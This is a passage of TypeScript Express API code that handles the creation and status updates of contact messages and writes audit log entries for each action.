      userEmail: req.user?.email || message.email,
      role: req.user?.role || 'Visitor',
      action: 'Contact Request Submitted',
      resource: `Contact message ${message.id} (${message.topic})`,
      resourceId: message.id,
      ipAddress: ip,
      userAgent: req.headers['user-agent']
    });

    res.status(201).json({ message });
  } catch (error) {
    res.status(400).json({ error: error instanceof Error ? error.message : 'Invalid contact request' });
  }
});

apiRouter.patch('/contact/messages/:id', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  try {
    const message = updateContactMessageStatus(orgId, req.params.id, req.body?.status);
    recordAuditLog({
      organizationId: orgId,
      userEmail: req.user?.email || 'analyst@oat.net',
      role: req.user?.role || 'Security Analyst',
      action: `Contact Request ${message.status}`,
      resource: `Contact message ${message.id}`,
      resourceId: message.id,
      ipAddress: req.ip || '127.0.0.1',
      userAgent: req.headers['user-agent']
    });
    res.json({ message });
  } catch (error) {
    const text = error instanceof Error ? error.message : 'Could not update message';
    res.status(text.includes('not found') ? 404 : 400).json({ error: text });
  }
});
